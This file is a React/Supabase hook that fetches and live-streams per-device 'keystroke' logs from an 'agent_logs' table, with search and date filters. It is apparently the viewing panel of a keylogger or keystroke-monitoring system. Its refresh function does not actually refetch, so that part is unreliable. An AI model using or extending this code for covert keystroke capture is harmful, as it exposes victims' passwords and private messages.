"use client"

import { useState, useEffect, useMemo } from "react"
import { createClient } from "@/lib/supabase/client"
import type { Database } from "@/lib/database.types"

type AgentLog = Database["public"]["Tables"]["agent_logs"]["Row"]
type LogFilter = {
  deviceId?: string
  searchTerm?: string
  startDate?: Date
  endDate?: Date
  limit?: number
}

export function useRealTimeLogs(filter: LogFilter = {}) {
  const [logs, setLogs] = useState<AgentLog[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [isRealTimeConnected, setIsRealTimeConnected] = useState(false)

  const supabase = createClient()
  const { deviceId, searchTerm, startDate, endDate, limit = 50 } = filter

  // Fetch initial logs
  useEffect(() => {
    const fetchLogs = async () => {
      setIsLoading(true)
      setError(null)

      try {
        console.log("Fetching logs with filters:", { deviceId, searchTerm, startDate, endDate, limit })

        let query = supabase.from("agent_logs").select("*").order("created_at", { ascending: false }).limit(limit)

        // Apply filters if provided
        if (deviceId) {
          query = query.eq("device_id", deviceId)
        }

        if (searchTerm) {
          query = query.ilike("keystroke", `%${searchTerm}%`)
        }

        if (startDate) {
          query = query.gte("created_at", startDate.toISOString())
        }

        if (endDate) {
          query = query.lte("created_at", endDate.toISOString())
        }

        const { data, error: fetchError } = await query

        if (fetchError) {
          throw new Error(fetchError.message)
        }

        console.log("Fetched logs:", data?.length || 0)
        setLogs(data || [])
      } catch (err) {
        const errorMessage = err instanceof Error ? err.message : "An unknown error occurred"
        console.error("Error fetching logs:", err)
        setError(errorMessage)
      } finally {
        setIsLoading(false)
      }
    }

    fetchLogs()
  }, [supabase, deviceId, searchTerm, startDate, endDate, limit])

  // Set up real-time subscription
  useEffect(() => {
    console.log("Setting up real-time subscription")

    const channel = supabase
      .channel("realtime-logs")
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "agent_logs",
          filter: deviceId ? `device_id=eq.${deviceId}` : undefined,
        },
        (payload) => {
          console.log("Received real-time update:", payload)

          // Check if the new log matches our search criteria
          const newLog = payload.new as AgentLog
          let shouldAdd = true

          if (searchTerm && !newLog.keystroke.toLowerCase().includes(searchTerm.toLowerCase())) {
            shouldAdd = false
          }

          if (startDate && new Date(newLog.created_at) < startDate) {
            shouldAdd = false
          }

          if (endDate && new Date(newLog.created_at) > endDate) {
            shouldAdd = false
          }

          if (shouldAdd) {
            console.log("Adding new log to state:", newLog)
            setLogs((prevLogs) => {
              // Check if log already exists to prevent duplicates
              if (prevLogs.some((log) => log.id === newLog.id)) {
                return prevLogs
              }
              // Add new log at the beginning and maintain the limit
              return [newLog, ...prevLogs].slice(0, limit)
            })
          }
        },
      )
      .subscribe((status) => {
        console.log("Realtime subscription status:", status)
        setIsRealTimeConnected(status === "SUBSCRIBED")
      })

    return () => {
      console.log("Cleaning up real-time subscription")
      channel.unsubscribe()
    }
  }, [supabase, deviceId, searchTerm, startDate, endDate, limit])

  // Filter logs client-side for real-time updates that might not match server filters
  const filteredLogs = useMemo(() => {
    return logs.filter((log) => {
      let matches = true

      if (searchTerm && !log.keystroke.toLowerCase().includes(searchTerm.toLowerCase())) {
        matches = false
      }

      if (deviceId && log.device_id !== deviceId) {
        matches = false
      }

      if (startDate && new Date(log.created_at) < startDate) {
        matches = false
      }

      if (endDate && new Date(log.created_at) > endDate) {
        matches = false
      }

      return matches
    })
  }, [logs, searchTerm, deviceId, startDate, endDate])

  return {
    logs: filteredLogs,
    isLoading,
    error,
    isRealTimeConnected,
    refresh: () => {
      setIsLoading(true)
      // This will trigger the useEffect to fetch logs again
    },
  }
}
